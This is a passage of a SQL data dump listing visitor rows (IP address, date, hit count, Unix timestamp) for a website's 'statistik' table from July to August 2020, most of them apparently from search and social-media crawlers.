('66.249.72.61', '2020-07-11', 1, '1594424310'),
('66.249.72.63', '2020-07-11', 3, '1594456944'),
('2a03:2880:ff:17::fac', '2020-07-11', 1, '1594428586'),
('2a03:2880:13ff:16::f', '2020-07-11', 1, '1594431535'),
('2a03:2880:13ff:9::fa', '2020-07-11', 1, '1594431536'),
('2a03:2880:21ff::face', '2020-07-11', 1, '1594435529'),
('2a03:2880:22ff:2::fa', '2020-07-11', 1, '1594441337'),
('2a03:2880:10ff:13::f', '2020-07-11', 1, '1594442150'),
('66.249.72.34', '2020-07-11', 2, '1594449736'),
('66.249.72.33', '2020-07-11', 1, '1594456945'),
('2a03:2880:11ff:15::f', '2020-07-11', 1, '1594459916'),
('2a03:2880:ff:10::fac', '2020-07-11', 1, '1594464064'),
('66.249.79.252', '2020-07-11', 49, '1594466412'),
('2a03:2880:21ff:4::fa', '2020-07-11', 1, '1594464371'),
('2a03:2880:21ff:2::fa', '2020-07-11', 1, '1594464373'),
('2a03:2880:21ff:8::fa', '2020-07-11', 1, '1594464408'),
('2a03:2880:21ff:b::fa', '2020-07-11', 1, '1594464411'),
('2a03:2880:21ff:15::f', '2020-07-11', 1, '1594464413'),
('66.249.79.233', '2020-07-11', 20, '1594467931'),
('2a03:2880:20ff:c::fa', '2020-07-11', 1, '1594464703'),
('2a03:2880:20ff:c::fa', '2020-07-11', 1, '1594464705'),
('66.249.79.251', '2020-07-11', 108, '1594467338'),
('2a03:2880:20ff:71::f', '2020-07-11', 1, '1594465094'),
('2a03:2880:20ff:3::fa', '2020-07-11', 1, '1594465096'),
('2a03:2880:11ff:6f::f', '2020-07-11', 1, '1594465112'),
('2a03:2880:11ff:d::fa', '2020-07-11', 1, '1594465114'),
('2a03:2880:20ff:6f::f', '2020-07-11', 1, '1594465116'),
('2a03:2880:20ff:76::f', '2020-07-11', 1, '1594465119'),
('2a03:2880:21ff:f::fa', '2020-07-11', 1, '1594465164'),
('2a03:2880:21ff:74::f', '2020-07-11', 1, '1594465166'),
('2a03:2880:11ff:2::fa', '2020-07-11', 1, '1594465441'),
('2a03:2880:11ff:5::fa', '2020-07-11', 1, '1594465443'),
('2a03:2880:20ff:1b::f', '2020-07-11', 1, '1594465472'),
('2a03:2880:20ff:1e::f', '2020-07-11', 1, '1594465474'),
('2a03:2880:20ff:5::fa', '2020-07-11', 1, '1594465749'),
('2a03:2880:20ff:77::f', '2020-07-11', 1, '1594465751'),
('2a03:2880:20ff:12::f', '2020-07-11', 1, '1594465756'),
('2a03:2880:20ff:15::f', '2020-07-11', 1, '1594465758'),
('2a03:2880:20ff:3::fa', '2020-07-11', 1, '1594465797'),
('2a03:2880:20ff:74::f', '2020-07-11', 1, '1594465799'),
('66.249.79.226', '2020-07-11', 3, '1594467308'),
('66.249.79.253', '2020-07-11', 3, '1594467315'),
('2a03:2880:20ff:7::fa', '2020-07-11', 1, '1594465885'),
('2a03:2880:20ff:d::fa', '2020-07-11', 1, '1594465887'),
('2a03:2880:21ff:77::f', '2020-07-11', 1, '1594465892'),
('2a03:2880:21ff:f::fa', '2020-07-11', 1, '1594465894'),
('2a03:2880:21ff:8::fa', '2020-07-11', 1, '1594465934'),
('2a03:2880:21ff:1a::f', '2020-07-11', 1, '1594465937'),
('2a03:2880:11ff:78::f', '2020-07-11', 1, '1594465940'),
('2a03:2880:11ff:1::fa', '2020-07-11', 1, '1594465942'),
('2a03:2880:20ff:1c::f', '2020-07-11', 1, '1594465956'),
('2a03:2880:20ff:70::f', '2020-07-11', 1, '1594465959'),
('2a03:2880:11ff:9::fa', '2020-07-11', 1, '1594466034'),
('2a03:2880:11ff:75::f', '2020-07-11', 1, '1594466037'),
('2a03:2880:21ff:b::fa', '2020-07-11', 1, '1594466137'),
('2a03:2880:21ff:14::f', '2020-07-11', 1, '1594466140'),
('2a03:2880:21ff:18::f', '2020-07-11', 1, '1594466221'),
('2a03:2880:21ff:1b::f', '2020-07-11', 1, '1594466223'),
('2a03:2880:21ff:a::fa', '2020-07-11', 1, '1594466257'),
('2a03:2880:21ff:78::f', '2020-07-11', 1, '1594466260'),
('2a03:2880:21ff:1c::f', '2020-07-11', 1, '1594466261'),
('66.249.79.225', '2020-07-11', 1, '1594466286'),
('2a03:2880:20ff:14::f', '2020-07-11', 1, '1594466311'),
('2a03:2880:20ff:17::f', '2020-07-11', 1, '1594466313'),
('2a03:2880:21ff:1b::f', '2020-07-11', 1, '1594466364'),
('2a03:2880:21ff:a::fa', '2020-07-11', 1, '1594466366'),
('2a03:2880:20ff:8::fa', '2020-07-11', 1, '1594466370'),
('2a03:2880:20ff:8::fa', '2020-07-11', 1, '1594466371'),
('2a03:2880:20ff:70::f', '2020-07-11', 1, '1594466401'),
('2a03:2880:20ff:74::f', '2020-07-11', 1, '1594466402'),
('2a03:2880:20ff:1b::f', '2020-07-11', 1, '1594466416'),
('2a03:2880:20ff:16::f', '2020-07-11', 1, '1594466418'),
('2a03:2880:11ff:75::f', '2020-07-11', 1, '1594466460'),
('2a03:2880:11ff:c::fa', '2020-07-11', 1, '1594466462'),
('2a03:2880:21ff:78::f', '2020-07-11', 1, '1594466483'),
('2a03:2880:21ff:17::f', '2020-07-11', 1, '1594466485'),
('2a03:2880:21ff:5::fa', '2020-07-11', 1, '1594466836'),
('2a03:2880:21ff:78::f', '2020-07-11', 1, '1594466837'),
('2a03:2880:22ff:16::f', '2020-07-11', 1, '1594466855'),
('2a03:2880:22ff:1a::f', '2020-07-11', 1, '1594466861'),
('2a03:2880:20ff:f::fa', '2020-07-11', 1, '1594466890'),
('2a03:2880:22ff:1::fa', '2020-07-11', 1, '1594466968'),
('2a03:2880:22ff:20::f', '2020-07-11', 1, '1594466971'),
('2a03:2880:20ff:1b::f', '2020-07-11', 1, '1594466992'),
('2a03:2880:20ff::face', '2020-07-11', 1, '1594466994'),
('2a03:2880:11ff:6::fa', '2020-07-11', 1, '1594467011'),
('2a03:2880:11ff:71::f', '2020-07-11', 1, '1594467012'),
('2a03:2880:11ff:78::f', '2020-07-11', 1, '1594467135'),
('2a03:2880:20ff:1::fa', '2020-07-11', 1, '1594467185'),
('2a03:2880:20ff:12::f', '2020-07-11', 1, '1594467186'),
('2a03:2880:22ff:74::f', '2020-07-11', 1, '1594467336'),
('2a03:2880:22ff:4::fa', '2020-07-11', 1, '1594467338'),
('2a03:2880:11ff:2::fa', '2020-07-11', 1, '1594467991'),
('2a03:2880:11ff:15::f', '2020-07-11', 1, '1594467993'),
('2a03:2880:20ff:75::f', '2020-07-11', 1, '1594470328'),
('2a03:2880:20ff:16::f', '2020-07-11', 1, '1594470330'),
('2a03:2880:20ff:18::f', '2020-07-11', 1, '1594471224'),
('2a03:2880:20ff:b::fa', '2020-07-11', 1, '1594471226'),
('2a03:2880:ff:6::face', '2020-07-11', 1, '1594476216'),
('2a03:2880:ff:2::face', '2020-07-11', 1, '1594476216'),
('2a03:2880:21ff:3::fa', '2020-07-11', 1, '1594478544'),
('2a03:2880:20ff:2::fa', '2020-07-11', 1, '1594481694'),
('2a03:2880:20ff:10::f', '2020-07-11', 1, '1594481696'),
('107.178.200.238', '2020-07-11', 1, '1594485990'),
('2a03:2880:13ff:c::fa', '2020-07-12', 1, '1594486927'),
('2a03:2880:21ff:15::f', '2020-07-12', 1, '1594488815'),
('2a03:2880:21ff:16::f', '2020-07-12', 1, '1594488816'),
('2a03:2880:11ff:19::f', '2020-07-12', 1, '1594501105'),
('2a03:2880:11ff:2::fa', '2020-07-12', 1, '1594503045'),
('2a03:2880:11ff:19::f', '2020-07-12', 1, '1594503047'),
('2a03:2880:21ff:6::fa', '2020-07-12', 1, '1594506951'),
('2a03:2880:21ff:4::fa', '2020-07-12', 1, '1594506952'),
('66.249.79.254', '2020-07-12', 3, '1594546755'),
('66.249.79.252', '2020-07-12', 1, '1594510157'),
('2a03:2880:21ff:1e::f', '2020-07-12', 1, '1594510525'),
('2a03:2880:21ff:f::fa', '2020-07-12', 1, '1594510527'),
('2a03:2880:21ff:4::fa', '2020-07-12', 1, '1594518138'),
('2a03:2880:21ff:6::fa', '2020-07-12', 1, '1594518141'),
('2a03:2880:ff:74::fac', '2020-07-12', 1, '1594519156'),
('2a03:2880:ff:16::fac', '2020-07-12', 1, '1594519156'),
('2a03:2880:ff:c::face', '2020-07-12', 1, '1594519189'),
('2a03:2880:ff:10::fac', '2020-07-12', 1, '1594519189'),
('2a03:2880:ff:a::face', '2020-07-12', 1, '1594519207'),
('2a03:2880:ff:a::face', '2020-07-12', 1, '1594519208'),
('2a03:2880:23ff:b::fa', '2020-07-12', 1, '1594519312'),
('2a03:2880:22ff::face', '2020-07-12', 1, '1594522097'),
('2a03:2880:22ff:4::fa', '2020-07-12', 1, '1594522099'),
('2a03:2880:21ff::face', '2020-07-12', 1, '1594535386'),
('2a03:2880:21ff:1a::f', '2020-07-12', 1, '1594535387'),
('2a03:2880:ff:6::face', '2020-07-12', 1, '1594541368'),
('2a03:2880:ff:c::face', '2020-07-12', 1, '1594541368'),
('2a03:2880:11ff:14::f', '2020-07-12', 1, '1594545124'),
('66.249.79.225', '2020-07-12', 1, '1594546756'),
('66.249.79.253', '2020-07-12', 1, '1594547336'),
('2a03:2880:13ff:6::fa', '2020-07-12', 1, '1594550893'),
('2a03:2880:ff:6f::fac', '2020-07-12', 1, '1594566705'),
('2a03:2880:13ff:f::fa', '2020-07-12', 1, '1594567026'),
('2a03:2880:ff:17::fac', '2020-07-12', 1, '1594568714'),
('2a03:2880:ff:4::face', '2020-07-12', 1, '1594568715'),
('2a03:2880:ff:1b::fac', '2020-07-13', 1, '1594581619'),
('66.249.79.253', '2020-07-13', 2, '1594595969'),
('66.249.79.251', '2020-07-13', 1, '1594595967'),
('2a03:2880:11ff:71::f', '2020-07-13', 1, '1594599942'),
('2a03:2880:21ff:77::f', '2020-07-13', 1, '1594600750'),
('2a03:2880:21ff:74::f', '2020-07-13', 1, '1594600751'),
('2a03:2880:32ff:d::fa', '2020-07-13', 1, '1594612638'),
('2a03:2880:32ff:d::fa', '2020-07-13', 1, '1594612640'),
('2a03:2880:ff::face:b', '2020-07-13', 1, '1594622366'),
('2a03:2880:ff:12::fac', '2020-07-13', 1, '1594622394'),
('2a03:2880:ff:15::fac', '2020-07-13', 1, '1594622395'),
('2a03:2880:12ff:4::fa', '2020-07-13', 1, '1594623986'),
('107.178.232.173', '2020-07-13', 1, '1594628094'),
('66.249.79.237', '2020-07-13', 1, '1594631250'),
('66.249.79.235', '2020-07-13', 3, '1594638479'),
('2a03:2880:22ff:1b::f', '2020-07-13', 1, '1594632323'),
('2a03:2880:20ff:13::f', '2020-07-13', 1, '1594637808'),
('2a03:2880:10ff:c::fa', '2020-07-13', 1, '1594646408'),
('2a03:2880:21ff:10::f', '2020-07-13', 1, '1594646458'),
('2a03:2880:ff:a::face', '2020-07-14', 1, '1594661574'),
('2a03:2880:13ff:2::fa', '2020-07-14', 1, '1594666292'),
('2a03:2880:ff:1c::fac', '2020-07-14', 1, '1594673951'),
('2a03:2880:22ff:10::f', '2020-07-14', 1, '1594674835'),
('2a03:2880:ff:20::fac', '2020-07-14', 1, '1594679049'),
('2a03:2880:ff:20::fac', '2020-07-14', 1, '1594679051'),
('66.249.79.235', '2020-07-14', 1, '1594679509'),
('66.249.79.237', '2020-07-14', 1, '1594679511'),
('66.249.79.251', '2020-07-14', 1, '1594681307'),
('66.249.79.233', '2020-07-14', 2, '1594681784'),
('107.178.232.249', '2020-07-14', 1, '1594705388'),
('2a03:2880:21ff:23::f', '2020-07-14', 1, '1594708993'),
('66.249.79.251', '2020-07-15', 3, '1594794743'),
('66.249.79.253', '2020-07-15', 4, '1594794741'),
('66.249.64.46', '2020-07-15', 1, '1594770619'),
('66.249.64.42', '2020-07-15', 1, '1594770621'),
('66.249.64.44', '2020-07-15', 1, '1594770625'),
('66.249.79.252', '2020-07-15', 1, '1594772123'),
('66.249.79.233', '2020-07-15', 1, '1594805645'),
('2a03:2880:10ff:19::f', '2020-07-15', 1, '1594807075'),
('2a03:2880:10ff:16::f', '2020-07-15', 1, '1594807075'),
('2a03:2880:10ff:6::fa', '2020-07-15', 1, '1594807209'),
('118.136.9.158', '2020-07-15', 69, '1594815075'),
('2a03:2880:ff:77::fac', '2020-07-15', 1, '1594814588'),
('2a03:2880:ff:75::fac', '2020-07-15', 1, '1594814590'),
('114.124.145.80', '2020-07-15', 2, '1594815099'),
('2a03:2880:22ff:13::f', '2020-07-16', 1, '1594839571'),
('66.249.64.62', '2020-07-16', 3, '1594845457'),
('107.178.232.157', '2020-07-16', 1, '1594849850'),
('66.249.79.226', '2020-07-16', 3, '1594903626'),
('66.249.79.251', '2020-07-16', 1, '1594856520'),
('66.249.79.253', '2020-07-16', 1, '1594856523'),
('114.124.145.223', '2020-07-16', 1, '1594857882'),
('2a03:2880:ff:d::face', '2020-07-16', 1, '1594884094'),
('2a03:2880:12ff:70::f', '2020-07-16', 1, '1594884116'),
('2a03:2880:ff:1a::fac', '2020-07-16', 1, '1594884142'),
('2a03:2880:21ff:1b::f', '2020-07-16', 1, '1594884257'),
('2a03:2880:23ff:7::fa', '2020-07-16', 1, '1594884260'),
('66.249.79.233', '2020-07-16', 2, '1594898600'),
('107.178.232.246', '2020-07-17', 1, '1594928049'),
('66.249.79.254', '2020-07-17', 2, '1594928767'),
('2a03:2880:12ff:6::fa', '2020-07-17', 1, '1594932534'),
('2a03:2880:12ff:16::f', '2020-07-17', 1, '1594932535'),
('66.249.79.237', '2020-07-17', 4, '1594972860'),
('66.249.79.235', '2020-07-17', 1, '1594942333'),
('66.249.79.233', '2020-07-17', 2, '1594972861'),
('118.136.9.158', '2020-07-17', 9, '1594988337');
INSERT INTO `statistik` (`ip`, `tanggal`, `hits`, `online`) VALUES
('2a03:2880:13ff:e::fa', '2020-07-17', 1, '1594972817'),
('66.249.79.226', '2020-07-17', 2, '1594983183'),
('2a03:2880:20ff:8::fa', '2020-07-17', 1, '1594983201'),
('2a03:2880:20ff:77::f', '2020-07-17', 1, '1594983203'),
('66.249.79.225', '2020-07-18', 2, '1595034334'),
('66.249.79.254', '2020-07-18', 3, '1595057856'),
('66.249.79.252', '2020-07-18', 2, '1595028753'),
('66.249.79.235', '2020-07-18', 1, '1595053213'),
('66.249.79.233', '2020-07-18', 2, '1595053217'),
('2a03:2880:21ff:18::f', '2020-07-18', 1, '1595063340'),
('2a03:2880:20ff:13::f', '2020-07-18', 1, '1595064456'),
('107.178.200.201', '2020-07-18', 1, '1595075204'),
('2a03:2880:21ff:70::f', '2020-07-18', 1, '1595085630'),
('66.249.79.226', '2020-07-19', 3, '1595146389'),
('66.249.79.253', '2020-07-19', 4, '1595146504'),
('66.249.79.251', '2020-07-19', 1, '1595114565'),
('2a03:2880:10ff::face', '2020-07-19', 1, '1595128276'),
('66.249.79.254', '2020-07-19', 1, '1595143322'),
('66.249.79.237', '2020-07-19', 1, '1595147295'),
('66.249.79.233', '2020-07-19', 5, '1595177156'),
('107.178.238.54', '2020-07-19', 1, '1595154386'),
('2a03:2880:13ff:78::f', '2020-07-19', 1, '1595158598'),
('2a03:2880:13ff:78::f', '2020-07-19', 1, '1595165471'),
('2a03:2880:22ff:17::f', '2020-07-19', 1, '1595166092'),
('2a03:2880:22ff:2::fa', '2020-07-19', 1, '1595166093'),
('66.249.79.235', '2020-07-19', 1, '1595177218'),
('66.249.79.252', '2020-07-20', 1, '1595189182'),
('66.249.79.254', '2020-07-20', 1, '1595189183'),
('66.249.79.233', '2020-07-20', 2, '1595193180'),
('66.249.79.235', '2020-07-20', 2, '1595193178'),
('2a03:2880:ff:71::fac', '2020-07-20', 1, '1595207219'),
('2a03:2880:ff:d::face', '2020-07-20', 1, '1595207436'),
('66.249.72.46', '2020-07-20', 1, '1595225278'),
('66.249.72.44', '2020-07-20', 1, '1595225279'),
('66.249.72.61', '2020-07-21', 2, '1595271718'),
('66.249.72.60', '2020-07-21', 1, '1595279588'),
('66.249.72.62', '2020-07-21', 3, '1595279595'),
('66.249.79.237', '2020-07-21', 1, '1595287570'),
('66.249.79.233', '2020-07-21', 1, '1595287573'),
('2a03:2880:31ff:10::f', '2020-07-21', 1, '1595294682'),
('2a03:2880:31ff::face', '2020-07-21', 1, '1595294684'),
('223.255.230.237', '2020-07-21', 5, '1595296793'),
('116.206.13.91', '2020-07-21', 13, '1595297662'),
('2a03:2880:ff:e::face', '2020-07-21', 1, '1595296946'),
('2a03:2880:ff:e::face', '2020-07-21', 1, '1595296947'),
('66.249.79.253', '2020-07-21', 3, '1595302394'),
('66.249.79.251', '2020-07-21', 1, '1595297414'),
('18.224.191.67', '2020-07-21', 1, '1595297596'),
('2a03:2880:30ff:13::f', '2020-07-21', 1, '1595299660'),
('107.178.239.218', '2020-07-21', 1, '1595303835'),
('66.249.79.254', '2020-07-21', 1, '1595314954'),
('2a03:2880:10ff:70::f', '2020-07-21', 1, '1595324705'),
('2a03:2880:10ff:76::f', '2020-07-21', 1, '1595324735'),
('2a03:2880:12ff:f::fa', '2020-07-21', 1, '1595327944'),
('2a03:2880:23ff:16::f', '2020-07-21', 1, '1595348176'),
('66.249.79.251', '2020-07-22', 4, '1595436862'),
('66.249.79.253', '2020-07-22', 2, '1595351994'),
('66.249.79.225', '2020-07-22', 1, '1595352686'),
('2a03:2880:13ff:12::f', '2020-07-22', 1, '1595357122'),
('2a03:2880:13ff:e::fa', '2020-07-22', 1, '1595357123'),
('66.249.79.235', '2020-07-22', 3, '1595395649'),
('66.249.79.233', '2020-07-22', 5, '1595433126'),
('2a03:2880:20ff:70::f', '2020-07-22', 1, '1595367521'),
('2a03:2880:21ff:11::f', '2020-07-22', 1, '1595367693'),
('35.203.245.147', '2020-07-22', 1, '1595383324'),
('2a03:2880:ff:17::fac', '2020-07-22', 1, '1595387219'),
('2a03:2880:ff:f::face', '2020-07-22', 1, '1595387232'),
('2a03:2880:27ff:17::f', '2020-07-22', 1, '1595403761'),
('2a03:2880:27ff:e::fa', '2020-07-22', 1, '1595403762'),
('2a03:2880:10ff:1c::f', '2020-07-22', 1, '1595407055'),
('66.249.79.226', '2020-07-22', 2, '1595436861'),
('2a03:2880:13ff:a::fa', '2020-07-22', 1, '1595414771'),
('2a03:2880:13ff:2::fa', '2020-07-22', 1, '1595420138'),
('2a03:2880:13ff:15::f', '2020-07-22', 1, '1595420138'),
('2a03:2880:13ff:c::fa', '2020-07-22', 1, '1595420138'),
('2a03:2880:13ff:11::f', '2020-07-22', 1, '1595420166'),
('2a03:2880:11ff:f::fa', '2020-07-22', 1, '1595421657'),
('66.249.79.231', '2020-07-22', 1, '1595433129'),
('66.249.79.233', '2020-07-23', 3, '1595473087'),
('66.249.79.235', '2020-07-23', 1, '1595451821'),
('2a03:2880:10ff:71::f', '2020-07-23', 1, '1595461281'),
('2a03:2880:ff:11::fac', '2020-07-23', 1, '1595466460'),
('2a03:2880:ff:76::fac', '2020-07-23', 1, '1595466460'),
('2a03:2880:10ff:6::fa', '2020-07-23', 1, '1595466715'),
('2a03:2880:ff:11::fac', '2020-07-23', 1, '1595469472'),
('2a03:2880:ff:19::fac', '2020-07-23', 1, '1595469472'),
('66.249.79.225', '2020-07-23', 2, '1595512863'),
('66.249.79.254', '2020-07-23', 2, '1595512266'),
('66.249.79.226', '2020-07-23', 1, '1595475481'),
('66.249.79.253', '2020-07-23', 1, '1595475482'),
('2a03:2880:10ff:6::fa', '2020-07-23', 1, '1595477201'),
('2a03:2880:11ff:5::fa', '2020-07-23', 1, '1595484878'),
('2a03:2880:11ff:11::f', '2020-07-23', 1, '1595484878'),
('2a03:2880:27ff:6f::f', '2020-07-23', 1, '1595492360'),
('2a03:2880:12ff:7::fa', '2020-07-23', 1, '1595497239'),
('2a03:2880:23ff:d::fa', '2020-07-23', 1, '1595502400'),
('66.249.79.252', '2020-07-23', 1, '1595512265'),
('52.230.80.222', '2020-07-24', 1, '1595528650'),
('107.178.239.218', '2020-07-24', 1, '1595532621'),
('66.249.79.237', '2020-07-24', 3, '1595597953'),
('66.249.79.235', '2020-07-24', 2, '1595582882'),
('66.249.79.253', '2020-07-24', 8, '1595590751'),
('66.249.79.226', '2020-07-24', 3, '1595578033'),
('66.249.79.254', '2020-07-24', 3, '1595604026'),
('66.249.79.225', '2020-07-24', 2, '1595572006'),
('66.249.79.252', '2020-07-24', 3, '1595604029'),
('66.249.79.233', '2020-07-24', 3, '1595597953'),
('2a03:2880:10ff:78::f', '2020-07-24', 1, '1595569956'),
('2a03:2880:10ff:12::f', '2020-07-24', 1, '1595569957'),
('2a03:2880:21ff:1e::f', '2020-07-24', 1, '1595573241'),
('2a03:2880:21ff:76::f', '2020-07-24', 1, '1595573244'),
('66.249.79.251', '2020-07-24', 2, '1595581675'),
('118.136.9.158', '2020-07-24', 5, '1595580328'),
('2a03:2880:27ff:75::f', '2020-07-24', 1, '1595581764'),
('2a03:2880:11ff:75::f', '2020-07-24', 1, '1595581764'),
('2a03:2880:ff:6f::fac', '2020-07-24', 1, '1595586911'),
('2a03:2880:ff::face:b', '2020-07-24', 1, '1595586911'),
('2a03:2880:13ff:17::f', '2020-07-24', 1, '1595595449'),
('66.249.79.253', '2020-07-25', 4, '1595656420'),
('2a03:2880:ff:1f::fac', '2020-07-25', 1, '1595612931'),
('2a03:2880:ff:6f::fac', '2020-07-25', 1, '1595612931'),
('107.178.236.5', '2020-07-25', 1, '1595614012'),
('66.249.79.233', '2020-07-25', 4, '1595635376'),
('66.249.79.252', '2020-07-25', 2, '1595671999'),
('66.249.79.237', '2020-07-25', 2, '1595628731'),
('66.249.79.235', '2020-07-25', 2, '1595658825'),
('66.249.79.225', '2020-07-25', 1, '1595639684'),
('66.249.79.226', '2020-07-25', 4, '1595665454'),
('66.249.79.254', '2020-07-25', 2, '1595678736'),
('2a03:2880:10ff:21::f', '2020-07-25', 1, '1595679456'),
('2606:4700:1101:0:ff4', '2020-07-25', 1, '1595683274'),
('66.249.79.251', '2020-07-25', 1, '1595683657'),
('2a03:2880:ff:18::fac', '2020-07-26', 1, '1595702482'),
('66.249.79.235', '2020-07-26', 1, '1595709861'),
('66.249.79.233', '2020-07-26', 5, '1595757281'),
('66.249.79.226', '2020-07-26', 5, '1595773896'),
('66.249.79.251', '2020-07-26', 3, '1595753238'),
('66.249.79.253', '2020-07-26', 1, '1595729328'),
('66.249.79.237', '2020-07-26', 4, '1595782203'),
('2a03:2880:11ff:4::fa', '2020-07-26', 1, '1595734780'),
('2a03:2880:11ff:15::f', '2020-07-26', 1, '1595734781'),
('2a03:2880:10ff:1e::f', '2020-07-26', 1, '1595749363'),
('116.206.28.35', '2020-07-26', 1, '1595749372'),
('66.249.79.225', '2020-07-26', 1, '1595761434'),
('2a03:2880:23ff:d::fa', '2020-07-26', 1, '1595762950'),
('2a03:2880:23ff:7::fa', '2020-07-26', 1, '1595762974'),
('66.249.79.252', '2020-07-26', 2, '1595777960'),
('107.178.237.26', '2020-07-26', 1, '1595766604'),
('125.162.209.139', '2020-07-26', 13, '1595774117'),
('66.249.79.254', '2020-07-26', 1, '1595777962'),
('66.249.79.233', '2020-07-27', 3, '1595792404'),
('66.249.79.225', '2020-07-27', 1, '1595794226'),
('66.249.79.226', '2020-07-27', 1, '1595797475'),
('66.249.79.253', '2020-07-27', 1, '1595797477'),
('66.249.79.251', '2020-07-27', 1, '1595797484'),
('66.249.72.46', '2020-07-27', 2, '1595832259'),
('66.249.72.42', '2020-07-27', 1, '1595824532'),
('66.249.72.62', '2020-07-27', 2, '1595840201'),
('66.249.72.44', '2020-07-27', 1, '1595826962'),
('107.178.237.13', '2020-07-27', 1, '1595849083'),
('66.249.72.63', '2020-07-27', 1, '1595855283'),
('66.249.72.33', '2020-07-27', 2, '1595867340'),
('2a03:2880:10ff:76::f', '2020-07-27', 1, '1595856529'),
('2a03:2880:10ff:1f::f', '2020-07-27', 1, '1595856658'),
('2a03:2880:10ff:74::f', '2020-07-27', 1, '1595856659'),
('2a03:2880:ff:13::fac', '2020-07-27', 1, '1595862040'),
('66.249.72.61', '2020-07-27', 1, '1595867339'),
('66.249.72.42', '2020-07-28', 4, '1595899527'),
('66.249.72.33', '2020-07-28', 5, '1595889685'),
('66.249.72.60', '2020-07-28', 2, '1595876998'),
('66.249.72.62', '2020-07-28', 4, '1595927641'),
('66.249.72.63', '2020-07-28', 2, '1595883891'),
('66.249.72.44', '2020-07-28', 2, '1595887253'),
('2a03:2880:10ff:1a::f', '2020-07-28', 1, '1595880646'),
('2a03:2880:10ff:21::f', '2020-07-28', 1, '1595880648'),
('66.249.72.34', '2020-07-28', 2, '1595927643'),
('2a03:2880:10ff:77::f', '2020-07-28', 1, '1595887301'),
('2a03:2880:10ff:76::f', '2020-07-28', 1, '1595887303'),
('66.249.72.61', '2020-07-28', 1, '1595888459'),
('2a03:2880:13ff:6f::f', '2020-07-28', 1, '1595888464'),
('2a03:2880:13ff:8::fa', '2020-07-28', 1, '1595888466'),
('2a03:2880:22ff:10::f', '2020-07-28', 1, '1595889698'),
('2a03:2880:22ff:4::fa', '2020-07-28', 1, '1595889699'),
('66.249.72.46', '2020-07-28', 1, '1595891491'),
('2a03:2880:ff:5::face', '2020-07-28', 1, '1595899938'),
('118.136.13.53', '2020-07-28', 8, '1595937116'),
('66.249.72.63', '2020-07-29', 3, '1595999243'),
('66.249.72.34', '2020-07-29', 2, '1596024387'),
('66.249.72.60', '2020-07-29', 2, '1596024384'),
('66.249.72.62', '2020-07-29', 1, '1595969746'),
('107.178.232.183', '2020-07-29', 1, '1596002213'),
('66.249.72.33', '2020-07-29', 2, '1596018400'),
('66.249.72.46', '2020-07-30', 1, '1596056125'),
('66.249.72.44', '2020-07-30', 2, '1596056131'),
('107.178.232.157', '2020-07-30', 1, '1596085210'),
('66.249.72.34', '2020-07-30', 2, '1596091517'),
('74.125.216.62', '2020-07-30', 1, '1596091519'),
('74.125.216.60', '2020-07-30', 3, '1596091799'),
('74.125.216.33', '2020-07-30', 1, '1596091803'),
('2a03:2880:ff:15::fac', '2020-07-30', 1, '1596126692'),
('66.249.72.42', '2020-07-31', 2, '1596142538'),
('66.249.72.44', '2020-07-31', 1, '1596142542'),
('2a03:2880:ff:12::fac', '2020-07-31', 1, '1596154665'),
('2a03:2880:ff:75::fac', '2020-07-31', 1, '1596154665'),
('2a03:2880:10ff:6::fa', '2020-07-31', 1, '1596168777'),
('2a03:2880:10ff:12::f', '2020-07-31', 1, '1596168944'),
('66.249.72.62', '2020-07-31', 1, '1596172622'),
('66.249.72.33', '2020-07-31', 1, '1596184625'),
('66.249.72.60', '2020-07-31', 1, '1596195177'),
('66.249.72.61', '2020-08-01', 2, '1596237896'),
('66.249.72.60', '2020-08-01', 2, '1596263601'),
('66.249.72.62', '2020-08-01', 3, '1596266694'),
('66.249.72.33', '2020-08-01', 1, '1596237897'),
('35.203.245.124', '2020-08-01', 1, '1596240277'),
('66.249.72.46', '2020-08-01', 4, '1596263257'),
('66.249.72.44', '2020-08-01', 3, '1596285819'),
('66.249.72.42', '2020-08-01', 3, '1596285820'),
('66.249.72.34', '2020-08-02', 1, '1596302695'),
('66.249.72.61', '2020-08-02', 1, '1596314770'),
('66.249.72.63', '2020-08-02', 2, '1596314776'),
('35.203.245.188', '2020-08-02', 1, '1596324263'),
('66.249.72.33', '2020-08-02', 1, '1596350791'),
('74.125.216.61', '2020-08-02', 2, '1596350929'),
('74.125.216.33', '2020-08-02', 1, '1596351070'),
('74.125.216.43', '2020-08-02', 1, '1596351163'),
('66.249.72.62', '2020-08-02', 1, '1596381595'),
('66.249.72.60', '2020-08-02', 1, '1596381596'),
('66.249.72.62', '2020-08-03', 3, '1596400590'),
('2a03:2880:ff:11::fac', '2020-08-03', 1, '1596419370'),
('2a03:2880:ff:13::fac', '2020-08-03', 1, '1596419463'),
('2a03:2880:ff:f::face', '2020-08-03', 1, '1596419463'),
('2a03:2880:ff:75::fac', '2020-08-03', 1, '1596423028'),
('51.158.114.198', '2020-08-03', 1, '1596431682'),
('51.158.117.104', '2020-08-03', 1, '1596437818'),
('66.249.72.61', '2020-08-04', 3, '1596507116'),
('107.178.237.15', '2020-08-04', 1, '1596481384'),
('66.249.72.44', '2020-08-04', 2, '1596486405'),
('66.249.72.42', '2020-08-04', 1, '1596486403'),
('66.249.72.62', '2020-08-04', 4, '1596511786'),
('2a03:2880:ff:77::fac', '2020-08-04', 1, '1596499746'),
('2a03:2880:10ff:2::fa', '2020-08-04', 1, '1596511634'),
('66.249.72.33', '2020-08-04', 3, '1596519142'),
('66.249.72.61', '2020-08-05', 2, '1596570070'),
('107.178.232.181', '2020-08-05', 1, '1596565447'),
('66.249.72.33', '2020-08-05', 2, '1596576898'),
('66.249.72.34', '2020-08-05', 1, '1596570673'),
('2a03:2880:21ff:6::fa', '2020-08-05', 1, '1596571646'),
('2a03:2880:21ff:1b::f', '2020-08-05', 1, '1596571649'),
('66.249.72.44', '2020-08-05', 1, '1596572218'),
('66.249.72.62', '2020-08-05', 1, '1596572811'),
('66.249.64.138', '2020-08-05', 2, '1596607189'),
('118.136.13.53', '2020-08-05', 2, '1596611166'),
('66.249.64.62', '2020-08-06', 1, '1596647566'),
('66.249.64.34', '2020-08-06', 1, '1596647568'),
('66.249.64.42', '2020-08-06', 2, '1596652412'),
('66.249.64.44', '2020-08-06', 3, '1596657688'),
('66.249.64.61', '2020-08-06', 2, '1596658668'),
('66.249.64.46', '2020-08-06', 1, '1596657689'),
('66.249.64.63', '2020-08-06', 1, '1596658665'),
('2a03:2880:10ff:1::fa', '2020-08-06', 1, '1596669615'),
('66.249.72.34', '2020-08-06', 2, '1596674853'),
('66.249.72.46', '2020-08-06', 1, '1596676653'),
('2a03:2880:ff:c::face', '2020-08-06', 1, '1596677799'),
